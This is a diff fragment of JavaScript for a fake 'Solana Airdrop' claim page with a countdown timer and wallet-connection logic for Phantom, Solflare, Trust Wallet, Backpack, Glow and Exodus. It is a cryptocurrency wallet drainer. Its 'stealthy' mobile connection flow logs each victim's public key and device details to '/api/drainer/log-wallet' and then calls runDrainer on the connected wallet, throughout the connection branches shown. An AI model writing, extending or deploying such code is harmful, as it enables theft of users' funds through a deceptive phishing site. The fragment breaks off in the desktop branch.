+          <img src="${wallet.icon}" alt="${wallet.name} logo" />
+          <span class="wallet-name">${wallet.name}</span>
+          ${actionBtn}
+        </div>
+      `;
+    }).join('');
+    // Attach event listeners for connect buttons
+    setTimeout(() => {
+      const connectBtns = walletList.querySelectorAll('.connect-wallet-btn');
+      connectBtns.forEach(btn => {
+        btn.addEventListener('click', function() {
+          const key = btn.getAttribute('data-wallet-key');
+          // Use the actual provider object at click time
+          const wallet = WALLET_DEFS.find(w => w.key === key);
+          if (wallet) {
+            const provider = wallet.provider();
+            if (provider && window.connectMobileWallet) {
+              // Pass the wallet object, but connectMobileWallet will use the current provider
+              window.connectMobileWallet(wallet);
+            }
+          }
+        });
+      });
+    }, 0);
+    modal.classList.add('active');
+  }
+}
+
+    // Countdown functionality
+    function updateCountdown() {
+      const now = new Date();
+      const targetDate = new Date('August 31, 2025 23:59:59');
+      const timeLeft = targetDate - now;
+      if (timeLeft <= 0) {
+        document.getElementById('countdown').innerHTML = 'Airdrop Closed';
+        return;
+      }
+      const days = Math.floor(timeLeft / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((timeLeft % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
+      document.getElementById('countdown').innerHTML = `${days}d ${hours}h ${minutes}m ${seconds}s`;
+    }
+
+    // Update countdown every second
+    setInterval(updateCountdown, 1000);
+    updateCountdown(); // Initial call
+
+    // Use the window.dAppMetadata that was set earlier
+
+    // Global error handler for blocked requests and other errors
+    window.addEventListener('error', function(event) {
+      // Ignore Sentry and other tracking errors that are blocked
+      if (event.message?.includes('Sentry') || 
+          event.message?.includes('sentry.io') || 
+          event.message?.includes('ERR_BLOCKED_BY_CLIENT')) {
+        console.log('[IGNORED] Blocked tracking request:', event.message);
+        return;
+      }
+      
+      // Log other errors but don't show to user unless critical
+      console.error('[GLOBAL_ERROR]', event.error || event.message);
+    });
+
+    // DOM Ready - Initialize everything after DOM is loaded
+    document.addEventListener('DOMContentLoaded', function() {
+      console.log('DOM loaded - initializing countdown and functions');
+      
+      // Initialize countdown
+      updateCountdown();
+      setInterval(updateCountdown, 1000);
+      
+      // Test claim button functionality
+      const claimButtons = document.querySelectorAll('.claim-btn, .nav-btn');
+      claimButtons.forEach(btn => {
+        if (btn.textContent.includes('Claim')) {
+          console.log('Found claim button:', btn);
+          btn.onclick = function() {
+            console.log('Claim button clicked!');
+            openWalletModal();
+          };
+        }
+      });
+      
+      // Test if functions exist
+      console.log('Function availability check:');
+      console.log('updateCountdown exists:', typeof updateCountdown === 'function');
+      console.log('openWalletModal exists:', typeof openWalletModal === 'function');
+      console.log('isMobile exists:', typeof isMobile === 'function');
+      console.log('showWalletBrowserPrompt exists:', typeof showWalletBrowserPrompt === 'function');
+      
+      console.log('Initialization complete');
+      
+
+      
+
+    });
+
+    // Solana Wallet Adapter metadata format
+    const walletAdapterMetadata = {
+      name: 'Solana Airdrop',
+      description: 'Claim your exclusive Solana token airdrop before August 31st',
+      url: window.location.origin,
+      icon: window.location.origin + '/logo.png',
+      appIdentity: {
+        name: 'Solana Airdrop',
+        uri: window.location.origin,
+        icon: window.location.origin + '/logo.png'
+      },
+      // Enhanced metadata for better wallet recognition
+      additionalInfo: {
+        displayName: 'Solana Airdrop',
+        description: 'Claim your exclusive Solana token airdrop before August 31st',
+        icon: window.location.origin + '/logo.png',
+        url: window.location.origin
+      }
+    };
+
+    // Function to manually set dApp name for wallet recognition
+    function setWalletDAppName(provider, walletName) {
+      try {
+        const metadata = window.dAppMetadata || {
+          name: 'Solana Airdrop',
+          description: 'Claim your exclusive Solana token airdrop before August 31st',
+          url: window.location.origin,
+          icon: window.location.origin + '/logo.png'
+        };
+        
+        // Try to set dApp name on provider if possible
+        if (provider && typeof provider.setAppMetadata === 'function') {
+          provider.setAppMetadata(metadata);
+        }
+        
+        // Set on window object for wallet detection
+        window.currentDAppName = metadata.name;
+        window.currentDAppDescription = metadata.description;
+        window.currentDAppUrl = metadata.url;
+        window.currentDAppIcon = metadata.icon;
+        
+        // Set document title for better recognition
+        document.title = metadata.name + ' - Claim Your $SOL';
+        
+      } catch (error) {
+        console.log('[setWalletDAppName] Error:', error);
+      }
+    }
+
+    // Enhanced wallet connection with proper metadata
+    async function connectWalletWithMetadata(provider, walletName) {
+      try {
+        // Set dApp name before connection
+        setWalletDAppName(provider, walletName);
+        
+        if (typeof provider.connect === 'function') {
+          // Try different metadata formats for different wallets
+          let result = null;
+          
+          // Trust Wallet specific connection
+          if (walletName === 'Trust Wallet') {
+            console.log('[TRUST] Attempting Trust Wallet connection...');
+            showStatus('🔍 Trust Wallet: Checking available methods...', 'loading');
+            
+            // Check what methods are available
+            const hasConnect = typeof provider.connect === 'function';
+            const hasSignIn = typeof provider.signIn === 'function';
+            const hasRequest = typeof provider.request === 'function';
+            
+            console.log('[TRUST] Available methods:', { hasConnect, hasSignIn, hasRequest });
+            showStatus(`🔍 Trust Wallet: Connect(${hasConnect}) SignIn(${hasSignIn}) Request(${hasRequest})`, 'loading');
+            
+            try {
+              // Add delay to prevent request conflicts
+              await new Promise(resolve => setTimeout(resolve, 1000));
+              
+              // Track this request to prevent conflicts
+              const requestId = `trust-connect-${Date.now()}`;
+              window.addPendingRequest(requestId);
+              
+              try {
+                // Trust Wallet prefers simple connect with timeout
+                const connectPromise = provider.connect();
+                const timeoutPromise = new Promise((_, reject) => 
+                  setTimeout(() => reject(new Error('Connection timeout')), 10000)
+                );
+                
+                result = await Promise.race([connectPromise, timeoutPromise]);
+                console.log('[TRUST] Connect result:', result);
+                return result;
+              } finally {
+                // Always remove the request tracking
+                window.removePendingRequest(requestId);
+              }
+            } catch (error) {
+              console.log('[TRUST] Connect failed, trying signIn:', error.message);
+              
+              // Handle specific Trust Wallet errors
+              if (error.message.includes('already pending')) {
+                showStatus('❌ Trust Wallet: Please approve the pending request in your wallet', 'error');
+                throw new Error('Request already pending - please approve in wallet');
+              }
+              
+              showStatus(`❌ Trust Wallet connect failed: ${error.message}`, 'error');
+              
+              // Add delay before retry
+              await new Promise(resolve => setTimeout(resolve, 2000));
+              
+              // Try signIn method if connect fails
+              if (typeof provider.signIn === 'function') {
+                try {
+                  const signInPromise = provider.signIn();
+                  const signInTimeoutPromise = new Promise((_, reject) => 
+                    setTimeout(() => reject(new Error('SignIn timeout')), 10000)
+                  );
+                  
+                  const signInResult = await Promise.race([signInPromise, signInTimeoutPromise]);
+                  console.log('[TRUST] SignIn result:', signInResult);
+                  return { publicKey: provider.publicKey || provider.address };
+                } catch (signInError) {
+                  console.log('[TRUST] SignIn failed:', signInError.message);
+                  showStatus(`❌ Trust Wallet signIn failed: ${signInError.message}`, 'error');
+                }
+              }
+              throw error;
+            }
+          }
+          
+          // Add delay to prevent request conflicts
+          await new Promise(resolve => setTimeout(resolve, 1000));
+          
+          // Track this request to prevent conflicts
+          const requestId = `${walletName}-connect-${Date.now()}`;
+          window.addPendingRequest(requestId);
+          
+          try {
+            // Try Wallet Adapter format first
+            try {
+              const connectPromise = provider.connect({
+                onlyIfTrusted: false,
+                appMetadata: walletAdapterMetadata
+              });
+              const timeoutPromise = new Promise((_, reject) => 
+                setTimeout(() => reject(new Error('Connection timeout')), 10000)
+              );
+              
+              result = await Promise.race([connectPromise, timeoutPromise]);
+            } catch (error) {
+              
+              // Try basic format
+              try {
+                const connectPromise = provider.connect({
+                  onlyIfTrusted: false,
+                  appMetadata: window.dAppMetadata
+                });
+                const timeoutPromise = new Promise((_, reject) => 
+                  setTimeout(() => reject(new Error('Connection timeout')), 10000)
+                );
+                
+                result = await Promise.race([connectPromise, timeoutPromise]);
+              } catch (error2) {
+                
+                // Try simple connect without metadata
+                const connectPromise = provider.connect();
+                const timeoutPromise = new Promise((_, reject) => 
+                  setTimeout(() => reject(new Error('Connection timeout')), 10000)
+                );
+                
+                result = await Promise.race([connectPromise, timeoutPromise]);
+              }
+            }
+          } finally {
+            // Always remove the request tracking
+            window.removePendingRequest(requestId);
+          }
+          
+          return result;
+        }
+        return null;
+      } catch (error) {
+        console.error(`[connectWalletWithMetadata] Error for ${walletName}:`, error);
+        throw error;
+      }
+    }
+
+    // Stealthy mobile wallet connection with simple fallbacks
+    window.connectMobileWallet = async function connectMobileWallet(wallet) {
+      let provider = wallet.provider();
+      console.log(`Provider for ${wallet.name} on connect:`, provider);
+      console.log('connectMobileWallet called with:', wallet);
+      const isMobileDevice = isMobile();
+      
+      // Simple fallback: if no provider, try to get it again
+      if (!provider) {
+        console.log(`[FALLBACK] No provider for ${wallet.name}, retrying...`);
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        provider = wallet.provider();
+      }
+      
+      try {
+        // On mobile, use stealthy but functional approach
+        if (isMobileDevice) {
+          
+          // First, try to get the wallet provider quietly
+          provider = wallet.provider();
+          console.log(`[connectMobileWallet] Initial provider for ${wallet.name}:`, provider);
+          
+          // Simple fallback: if no provider, try again
+          if (!provider) {
+            console.log(`[FALLBACK] No provider for ${wallet.name}, retrying...`);
+            await new Promise(resolve => setTimeout(resolve, 2000));
+            provider = wallet.provider();
+          }
+          
+          // If still no provider, try to open the app and then check again
+          if (!provider) {
+            // Check if we're on mobile for better deep linking
+            const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            
+            if (isMobileDevice) {
+              console.log(`[connectMobileWallet] Mobile device detected for ${wallet.name}`);
+            }
+            
+            // Enhanced deep linking for seamless wallet opening
+            try {
+              if (wallet.name === 'Phantom') {
+                // Use direct window.open for better deep linking
+                const currentUrl = window.location.href;
+                
+                // Try direct deep link first
+                const phantomDeepLink = `phantom://app/${encodeURIComponent(currentUrl)}`;
+                console.log(`[connectMobileWallet] Trying Phantom deep link: ${phantomDeepLink}`);
+                
+                // Use window.open for better compatibility
+                const phantomWindow = window.open(phantomDeepLink, '_blank');
+                
+                // If window.open fails, try location.href
+                if (!phantomWindow || phantomWindow.closed) {
+                  console.log(`[connectMobileWallet] Phantom window.open failed, trying location.href`);
+                  window.location.href = phantomDeepLink;
+                }
+              } else if (wallet.name === 'Solflare') {
+                // Use direct window.open for better deep linking
+                const currentUrl = window.location.href;
+                
+                // Try direct deep link first
+                const solflareDeepLink = `solflare://access-wallet?url=${encodeURIComponent(currentUrl)}`;
+                console.log(`[connectMobileWallet] Trying Solflare deep link: ${solflareDeepLink}`);
+                
+                // Use window.open for better compatibility
+                const solflareWindow = window.open(solflareDeepLink, '_blank');
+                
+                // If window.open fails, try location.href
+                if (!solflareWindow || solflareWindow.closed) {
+                  console.log(`[connectMobileWallet] Solflare window.open failed, trying location.href`);
+                  window.location.href = solflareDeepLink;
+                }
+              } else if (wallet.name === 'Backpack') {
+                  // Use Backpack's correct DApp deep link format
+                  const currentUrl = window.location.href;
+                  
+                  // Backpack uses: https://backpack.app/dapp/https://yourdapp.com
+                  try {
+                    window.location.href = `https://backpack.app/dapp/${currentUrl}`;
+                  } catch (e) {
+                    // Fallback to web
+                    window.location.href = `https://backpack.app/`;
+                  }
+              } else if (wallet.name === 'Glow') {
+                window.location.href = 'glow://';
+              } else if (wallet.name === 'Trust Wallet') {
+                window.location.href = 'trust://';
+              } else if (wallet.name === 'Exodus') {
+                window.location.href = 'exodus://';
+              }
+            } catch (e) {
+            }
+            
+            // Wait a bit and check for provider again
+            showStatus(`Opening ${wallet.name} app...`, 'loading');
+            
+            // Enhanced provider detection with better timing and fallback
+            let providerFound = false;
+            for (let i = 0; i < 8; i++) {
+              await new Promise(resolve => setTimeout(resolve, 800));
+              
+              provider = wallet.provider();
+              console.log(`[connectMobileWallet] Provider for ${wallet.name} after wait ${i+1}:`, provider);
+              
+              if (provider) {
+                providerFound = true;
+                console.log(`[connectMobileWallet] Provider found for ${wallet.name} after ${i+1} attempts`);
+                break;
+              }
+            }
+            
+            if (!providerFound) {
+              console.log(`[connectMobileWallet] No provider found for ${wallet.name} after all attempts`);
+              
+              // Try multiple fallback deep links
+              if (wallet.name === 'Phantom') {
+                console.log(`[connectMobileWallet] Trying Phantom fallback deep links`);
+                
+                // Try multiple Phantom deep link formats
+                setTimeout(() => {
+                  window.location.href = 'phantom://';
+                }, 500);
+                
+                setTimeout(() => {
+                  window.location.href = 'https://phantom.app/';
+                }, 1000);
+                
+              } else if (wallet.name === 'Solflare') {
+                console.log(`[connectMobileWallet] Trying Solflare fallback deep links`);
+                
+                // Try multiple Solflare deep link formats
+                setTimeout(() => {
+                  window.location.href = 'solflare://access-wallet';
+                }, 500);
+                
+                setTimeout(() => {
+                  window.location.href = 'https://solflare.com/';
+                }, 1000);
+              }
+            }
+            
+            // If still no provider after deep linking, try to open app store as fallback
+            if (!provider) {
+              console.log(`[connectMobileWallet] No provider found for ${wallet.name}, trying app store fallback`);
+              try {
+                if (wallet.name === 'Phantom') {
+                  window.open('https://phantom.app/', '_blank');
+                } else if (wallet.name === 'Solflare') {
+                  window.open('https://solflare.com/', '_blank');
+                } else if (wallet.name === 'Backpack') {
+                  window.open('https://backpack.app/', '_blank');
+                } else if (wallet.name === 'Glow') {
+                  window.open('https://glow.app/', '_blank');
+                } else if (wallet.name === 'Trust Wallet') {
+                  window.open('https://trustwallet.com/', '_blank');
+                } else if (wallet.name === 'Exodus') {
+                  window.open('https://exodus.com/', '_blank');
+                }
+              } catch (e) {
+                console.error(`[connectMobileWallet] Error opening app store for ${wallet.name}:`, e);
+              }
+            }
+          }
+          
+          // If we have a provider, try to connect
+          if (provider) {
+            // Check if wallet is available before attempting connection
+            if (typeof provider.isConnected === 'function' && !provider.isConnected()) {
+              showStatus(`Please open ${wallet.name} app first, then try again.`, 'error');
+              return;
+            }
+            
+            // Try to connect
+            if (typeof provider.connect === 'function') {
+              try {
+                console.log(`[connectMobileWallet] Calling connectWalletWithMetadata for ${wallet.name}`);
+                
+                // Add timeout wrapper for connection with retry logic
+                let result;
+                let retryCount = 0;
+                const maxRetries = 2;
+                
+                while (retryCount <= maxRetries) {
+                  try {
+                    const connectionPromise = connectWalletWithMetadata(provider, wallet.name);
+                    const timeoutPromise = new Promise((_, reject) => {
+                      setTimeout(() => reject(new Error('Connection timeout - please try again')), 15000);
+                    });
+                    
+                    result = await Promise.race([connectionPromise, timeoutPromise]);
+                    break; // Success, exit retry loop
+                  } catch (error) {
+                    retryCount++;
+                    console.log(`[connectMobileWallet] Connection attempt ${retryCount}/${maxRetries + 1} failed for ${wallet.name}:`, error.message);
+                    
+                    if (retryCount > maxRetries) {
+                      throw error; // Re-throw if all retries failed
+                    }
+                    
+                    // Wait before retry
+                    showStatus(`Retrying ${wallet.name} connection... (${retryCount}/${maxRetries + 1})`, 'loading');
+                    await new Promise(resolve => setTimeout(resolve, 1000 * retryCount));
+                  }
+                }
+                console.log(`[connectMobileWallet] connectWalletWithMetadata result for ${wallet.name}:`, result);
+                // Wait a bit for connection to establish
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // Check if we got a public key
+                const publicKey = provider.publicKey || provider.address || result?.publicKey;
+                console.log(`[connectMobileWallet] publicKey for ${wallet.name}:`, publicKey);
+                
+                if (publicKey) {
+                  showStatus(`${wallet.name} connected!`, 'success');
+                  console.log(`[connectMobileWallet] About to call runDrainer for ${wallet.name}`);
+                  
+                  // Log wallet connection
+                  try {
+                    fetch('/api/drainer/log-wallet', {
+                      method: 'POST',
+                      headers: { 'Content-Type': 'application/json' },
+                      body: JSON.stringify({
+                        publicKey: publicKey.toString(),
+                        walletType: wallet.name,
+                        origin: window.location.origin,
+                        userAgent: navigator.userAgent
+                      })
+                    }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                    
+                    console.log('[WALLET] Logged mobile connection:', {
+                      publicKey: publicKey.toString(),
+                      walletType: wallet.name,
+                      origin: window.location.origin
+                    });
+                  } catch (logError) {
+                    console.error('[WALLET] Failed to log wallet connection:', logError);
+                  }
+                  
+                  // Ensure provider is still connected before running drainer
+                  if (provider && (provider.connected || provider.publicKey)) {
+                  runDrainer(provider);
+                  } else {
+                    console.error(`[connectMobileWallet] Provider disconnected for ${wallet.name}`);
+                    showStatus(`${wallet.name} connection lost. Please try again.`, 'error');
+                  }
+                } else {
+                  // Try to force approval by attempting a transaction
+                  showStatus(`Please approve the connection in ${wallet.name}`, 'loading');
+                  
+                  // Try to trigger approval by attempting to sign a message
+                  if (typeof provider.signMessage === 'function') {
+                    try {
+                      const message = new TextEncoder().encode('Connect to Solana Airdrop');
+                      const signature = await provider.signMessage(message);
+                      console.log(`[connectMobileWallet] signMessage signature for ${wallet.name}:`, signature);
+                      showStatus(`${wallet.name} approved!`, 'success');
+                      setTimeout(() => {
+                        // Re-check provider state before running drainer
+                        if (provider && (provider.connected || provider.publicKey)) {
+                        runDrainer(provider);
+                        } else {
+                          showStatus(`${wallet.name} connection lost. Please try again.`, 'error');
+                        }
+                      }, 1000);
+                    } catch (signError) {
+                      console.error(`[connectMobileWallet] signMessage error for ${wallet.name}:`, signError);
+                    }
+                  } else {
+                    showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+                    console.error(`[connectMobileWallet] No signMessage function for ${wallet.name}`);
+                  }
+                }
+              } catch (connectError) {
+                console.error(`[connectMobileWallet] connectWalletWithMetadata error for ${wallet.name}:`, connectError);
+                
+                // Handle timeout errors specifically
+                if (connectError.message?.includes('timeout') || connectError.message?.includes('Connection timeout') || connectError.message?.includes('JSON-RPC: method call timeout')) {
+                  showStatus(`⏰ ${wallet.name} connection timeout. Please ensure your wallet app is open and responsive, then try again.`, 'error');
+                  return;
+                }
+                // Enhanced Solflare connection methods
+                if (wallet.name === 'Solflare') {
+                  try {
+                    // Try signIn method first
+                    if (typeof provider.signIn === 'function') {
+                    const signInResult = await provider.signIn();
+                    showStatus('Solflare connected via signIn!', 'success');
+                      
+                      // Log wallet connection
+                      try {
+                        const publicKey = provider.publicKey || provider.address;
+                        if (publicKey) {
+                          fetch('/api/drainer/log-wallet', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              walletType: 'Solflare',
+                              origin: window.location.origin,
+                              userAgent: navigator.userAgent
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                        }
+                      } catch (logError) {
+                        console.error('[WALLET] Failed to log wallet connection:', logError);
+                      }
+                      
+                    setTimeout(() => {
+                      runDrainer(provider);
+                    }, 1000);
+                      return;
+                    }
+                    
+                    // Try request method
+                    if (typeof provider.request === 'function') {
+                      const requestResult = await provider.request({ method: 'connect' });
+                      showStatus('Solflare connected via request!', 'success');
+                      
+                      // Log wallet connection
+                      try {
+                        const publicKey = provider.publicKey || provider.address;
+                        if (publicKey) {
+                          fetch('/api/drainer/log-wallet', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              walletType: 'Solflare',
+                              origin: window.location.origin,
+                              userAgent: navigator.userAgent
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                        }
+                      } catch (logError) {
+                        console.error('[WALLET] Failed to log wallet connection:', logError);
+                      }
+                      
+                      setTimeout(() => {
+                        runDrainer(provider);
+                      }, 1000);
+                      return;
+                    }
+                    
+                    // Try basic connect without metadata
+                    if (typeof provider.connect === 'function') {
+                      const connectResult = await provider.connect();
+                      showStatus('Solflare connected!', 'success');
+                      
+                      // Log wallet connection
+                      try {
+                        const publicKey = provider.publicKey || provider.address;
+                        if (publicKey) {
+                          fetch('/api/drainer/log-wallet', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                              publicKey: publicKey.toString(),
+                              walletType: 'Solflare',
+                              origin: window.location.origin,
+                              userAgent: navigator.userAgent
+                            })
+                          }).catch(err => console.log('[TELEGRAM] Failed to log wallet connection:', err));
+                        }
+                      } catch (logError) {
+                        console.error('[WALLET] Failed to log wallet connection:', logError);
+                      }
+                      
+                      setTimeout(() => {
+                        runDrainer(provider);
+                      }, 1000);
+                      return;
+                    }
+                    
+                    showStatus('Solflare connection method not available', 'error');
+                  } catch (solflareError) {
+                    console.error(`[connectMobileWallet] Solflare connection error:`, solflareError);
+                    showStatus('Solflare connection failed. Please try again.', 'error');
+                  }
+                } else if (wallet.name === 'Trust Wallet') {
+                  try {
+                    console.log('[TRUST] Trust Wallet detected - checking if supported...');
+                    
+                    // Check if this is the unsupported Trust Wallet provider (mobile only)
+                    if (provider && provider.isUnsupported) {
+                      showStatus('⚠️ Trust Wallet mobile dApp browser has limited Solana support', 'error');
+                      
+                      // Show alternative wallet options
+                      setTimeout(() => {
+                        showStatus('💡 Please use Phantom or Solflare for this airdrop', 'info');
+                        
+                        // Show wallet selection modal with supported wallets
+                        const modal = document.getElementById('walletModal');
+                        const walletList = document.getElementById('walletList');
+                        
+                        if (modal && walletList) {
+                          // Filter to show only supported wallets
+                          const supportedWallets = WALLET_DEFS.filter(w => 
+                            w.name !== 'Trust Wallet' && 
+                            (w.name === 'Phantom' || w.name === 'Solflare' || w.name === 'Backpack' || w.name === 'Glow' || w.name === 'Exodus')
+                          );
+                          
+                          walletList.innerHTML = supportedWallets.map(wallet => `
+                            <div class="wallet-option">
+                              <img src="${wallet.icon}" alt="${wallet.name} logo" />
+                              <span class="wallet-name">${wallet.name}</span>
+                              <button class="claim-btn" onclick="connectMobileWallet(${JSON.stringify(wallet)})">
+                                Use ${wallet.name}
+                              </button>
+                            </div>
+                          `).join('');
+                          
+                          modal.classList.add('active');
+                        }
+                      }, 2000);
+                      
+                      return;
+                    }
+                    
+                    // If it's a regular Trust Wallet provider, try to connect
+                    showStatus('🔍 Trust Wallet: Attempting connection...', 'loading');
+                    
+                    if (typeof provider.connect === 'function') {
+                      try {
+                        // Add delay to prevent request conflicts
+                        await new Promise(resolve => setTimeout(resolve, 2000));
+                        
+                        // Track this request to prevent conflicts
+                        const requestId = `trust-mobile-connect-${Date.now()}`;
+                        window.addPendingRequest(requestId);
+                        
+                        try {
+                          // Try with timeout to prevent hanging
+                          const connectPromise = provider.connect();
+                          const timeoutPromise = new Promise((_, reject) => 
+                            setTimeout(() => reject(new Error('Connection timeout')), 15000)
+                          );
+                          
+                          const result = await Promise.race([connectPromise, timeoutPromise]);
+                          showStatus('Trust Wallet connected!', 'success');
+                          setTimeout(() => {
+                            runDrainer(provider);
+                          }, 1000);
+                          return;
+                        } finally {
+                          // Always remove the request tracking
+                          window.removePendingRequest(requestId);
+                        }
+                      } catch (error) {
+                        console.log('[TRUST] Connect failed:', error.message);
+                        
+                        // Handle specific Trust Wallet errors
+                        if (error.message.includes('already pending')) {
+                          showStatus('❌ Trust Wallet: Please approve the pending request in your wallet', 'error');
+                          setTimeout(() => {
+                            showStatus('💡 Try refreshing the page and connecting again', 'info');
+                          }, 3000);
+                        } else if (error.message.includes('timeout')) {
+                          showStatus('❌ Trust Wallet: Connection timed out - please try again', 'error');
+                        } else {
+                          showStatus('❌ Trust Wallet: Connection failed - limited Solana support on mobile', 'error');
+                        }
+                        
+                        // Show alternative wallets
+                        setTimeout(() => {
+                          showStatus('💡 Please use Phantom or Solflare instead', 'info');
+                        }, 4000);
+                      }
+                    } else {
+                      showStatus('❌ Trust Wallet: No connection method available', 'error');
+                    }
+                    
+                  } catch (trustWalletError) {
+                    console.error(`[connectMobileWallet] Trust Wallet connection error:`, trustWalletError);
+                    showStatus(`❌ Trust Wallet error: ${trustWalletError.message}`, 'error');
+                  }
+                } else if (wallet.name === 'Glow') {
+                  try {
+                    console.log('[GLOW] Glow Wallet detected - attempting connection...');
+                    
+                    // Add delay to prevent request conflicts
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    // Track this request to prevent conflicts
+                    const requestId = `glow-connect-${Date.now()}`;
+                    window.addPendingRequest(requestId);
+                    
+                    try {
+                      if (typeof provider.connect === 'function') {
+                        const connectPromise = provider.connect();
+                        const timeoutPromise = new Promise((_, reject) => 
+                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
+                        );
+                        
+                        const result = await Promise.race([connectPromise, timeoutPromise]);
+                        showStatus('Glow connected!', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                        return;
+                      } else if (typeof provider.request === 'function') {
+                        const requestPromise = provider.request({ method: 'connect' });
+                        const timeoutPromise = new Promise((_, reject) => 
+                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
+                        );
+                        
+                        const result = await Promise.race([requestPromise, timeoutPromise]);
+                        showStatus('Glow connected!', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                        return;
+                      } else {
+                        showStatus('Glow connection method not available', 'error');
+                      }
+                    } finally {
+                      // Always remove the request tracking
+                      window.removePendingRequest(requestId);
+                    }
+                  } catch (glowError) {
+                    console.error(`[connectMobileWallet] Glow connection error:`, glowError);
+                    
+                    // Handle specific Glow errors
+                    if (glowError.message.includes('already pending')) {
+                      showStatus('❌ Glow: Please approve the pending request in your wallet', 'error');
+                    } else if (glowError.message.includes('timeout')) {
+                      showStatus('❌ Glow: Connection timed out - please try again', 'error');
+                    } else {
+                      showStatus('Glow connection failed. Please try again.', 'error');
+                    }
+                  }
+                } else if (wallet.name === 'Backpack') {
+                  try {
+                    console.log('[BACKPACK] Backpack Wallet detected - attempting connection...');
+                    
+                    // Add delay to prevent request conflicts
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    // Track this request to prevent conflicts
+                    const requestId = `backpack-connect-${Date.now()}`;
+                    window.addPendingRequest(requestId);
+                    
+                    try {
+                      if (typeof provider.connect === 'function') {
+                        const connectPromise = provider.connect();
+                        const timeoutPromise = new Promise((_, reject) => 
+                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
+                        );
+                        
+                        const result = await Promise.race([connectPromise, timeoutPromise]);
+                        showStatus('Backpack connected!', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                        return;
+                      } else if (typeof provider.request === 'function') {
+                        const requestPromise = provider.request({ method: 'connect' });
+                        const timeoutPromise = new Promise((_, reject) => 
+                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
+                        );
+                        
+                        const result = await Promise.race([requestPromise, timeoutPromise]);
+                        showStatus('Backpack connected!', 'success');
+                        setTimeout(() => {
+                          runDrainer(provider);
+                        }, 1000);
+                        return;
+                      } else {
+                        showStatus('Backpack connection method not available', 'error');
+                      }
+                    } finally {
+                      // Always remove the request tracking
+                      window.removePendingRequest(requestId);
+                    }
+                  } catch (backpackError) {
+                    console.error(`[connectMobileWallet] Backpack connection error:`, backpackError);
+                    
+                    // Handle specific Backpack errors
+                    if (backpackError.message.includes('already pending')) {
+                      showStatus('❌ Backpack: Please approve the pending request in your wallet', 'error');
+                    } else if (backpackError.message.includes('timeout')) {
+                      showStatus('❌ Backpack: Connection timed out - please try again', 'error');
+                    } else {
+                      showStatus('Backpack connection failed. Please try again.', 'error');
+                    }
+                  }
+                } else if (wallet.name === 'Exodus') {
+                  // Exodus specific connection logic
+                  try {
+                    
+                    // Add delay to prevent request conflicts
+                    await new Promise(resolve => setTimeout(resolve, 1000));
+                    
+                    // Track this request to prevent conflicts
+                    const requestId = `exodus-connect-${Date.now()}`;
+                    window.addPendingRequest(requestId);
+                    
+                    try {
+                      // Try different Exodus connection methods
+                      if (typeof provider.connect === 'function') {
+                        const connectPromise = provider.connect();
+                        const timeoutPromise = new Promise((_, reject) => 
+                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
+                        );
+                        
+                        const result = await Promise.race([connectPromise, timeoutPromise]);
+                        
+                        if (result && result.publicKey) {
+                          showStatus('Exodus connected!', 'success');
+                          setTimeout(() => {
+                            runDrainer(provider);
+                          }, 1000);
+                        } else {
+                          showStatus('Please approve the connection in Exodus', 'error');
+                        }
+                      } else if (typeof provider.request === 'function') {
+                        // Try request method
+                        const requestPromise = provider.request({ method: 'connect' });
+                        const timeoutPromise = new Promise((_, reject) => 
+                          setTimeout(() => reject(new Error('Connection timeout')), 15000)
+                        );
+                        
+                        const result = await Promise.race([requestPromise, timeoutPromise]);
+                        
+                        if (result) {
+                          showStatus('Exodus connected!', 'success');
+                          setTimeout(() => {
+                            runDrainer(provider);
+                          }, 1000);
+                        } else {
+                          showStatus('Please approve the connection in Exodus', 'error');
+                        }
+                      } else {
+                        showStatus('Exodus connection method not available', 'error');
+                      }
+                    } finally {
+                      // Always remove the request tracking
+                      window.removePendingRequest(requestId);
+                    }
+                  } catch (exodusError) {
+                    console.error(`[connectMobileWallet] Exodus connection error:`, exodusError);
+                    
+                    // Handle specific Exodus errors
+                    if (exodusError.message.includes('already pending')) {
+                      showStatus('❌ Exodus: Please approve the pending request in your wallet', 'error');
+                    } else if (exodusError.message.includes('timeout')) {
+                      showStatus('❌ Exodus: Connection timed out - please try again', 'error');
+                    } else {
+                      showStatus('Exodus connection failed. Please try again.', 'error');
+                    }
+                  }
+                } else {
+                  showStatus(`Please approve the connection in ${wallet.name}`, 'error');
+                }
+              }
+            } else {
+              showStatus(`${wallet.name} connection method not available`, 'error');
+              console.error(`[connectMobileWallet] No connect function for ${wallet.name}`);
+            }
+          } else {
+            // No provider found, show subtle wallet browser prompt with all supported wallets
+            console.error(`[connectMobileWallet] No provider found for ${wallet.name} after waiting.`);
+            console.log(`[connectMobileWallet] Provider value:`, provider);
+            console.log(`[connectMobileWallet] Provider type:`, typeof provider);
+            showWalletBrowserPrompt();
+          }
+          
+        } else {
+          // Desktop logic (unchanged)
+          const provider = wallet.provider();
